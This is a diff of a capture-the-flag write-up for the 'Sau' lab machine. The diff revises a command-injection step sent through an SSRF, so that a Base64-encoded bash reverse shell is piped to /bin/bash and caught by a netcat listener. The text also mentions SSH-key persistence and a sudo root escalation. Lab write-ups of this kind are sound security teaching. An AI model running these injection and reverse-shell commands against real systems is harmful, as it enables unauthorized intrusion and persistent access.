@@ -302,11 +302,11 @@ First, I'll setup a listener to receive the shell.
 ❯ rlwrap nc -lvnp "9001"
 ```
 
-Then, I'll choose the 'nc mkfifo' payload from
+Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
 [RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
 shell.
 
-I'll save the URL encoded version of it as the `COMMAND` shell variable.
+I'll save it as the `BASE64_REVSHELL_PAYLOAD` shell variable.
 
 However, we can't directly send the command to the web server on port `80/tcp`,
 so we'll use the SSRF we identified [earlier](#ssrf-cve-2023-27163) to do so.
@@ -323,7 +323,7 @@ sent to `http://127.0.0.1/login`, the vulnerable endpoint.
 Now let's send our reverse shell payload to our basket:
 
 ```sh
-❯ curl -s -o /dev/null "http://10.10.11.224:55555/login?username=;%60$COMMAND%60"
+❯ curl -s -o /dev/null "http://10.10.11.224:55555/login" --data-urlencode "username=;%60/bin/echo $BASE64_REVSHELL_PAYLOAD | /usr/bin/base64 -d | /bin/bash -i%60"
 ```
 
 If we check our listener:
@@ -336,7 +336,7 @@ puma@sau:/opt/maltrail$
 
 It caught the reverse shell!
 
-## Stabilizing the shell
+### Stabilizing the shell
 
 Our home folder doesn't contain a `.ssh` folder, so I'll create one. Then I'll
 create a private key and I'll add the corresponding key to `authorized_keys`.
@@ -528,6 +528,8 @@ sau
 
 Yeah I know, very surprising.
 
+## System enumeration
+
 ### Flags
 
 If we check our home folder, we find the user flag.
@@ -600,13 +602,13 @@ Now I'll just copy and paste the given command to abuse our `sudo` permissions:
 
 Yay!
 
-## Stabilizing the shell
+### Stabilizing the shell
 
 Our home folder contains a `.ssh` directory. There's no existing private key, so
 I'll create one and add the corresponding public key to `authorized_keys`, and
 then I'll connect over SSH to Sau. This way, I'll have a much more stable shell.
 
-## Getting a lay of the land
+## System enumeration
 
 If we run `whoami`, we see that we're `root`!
 
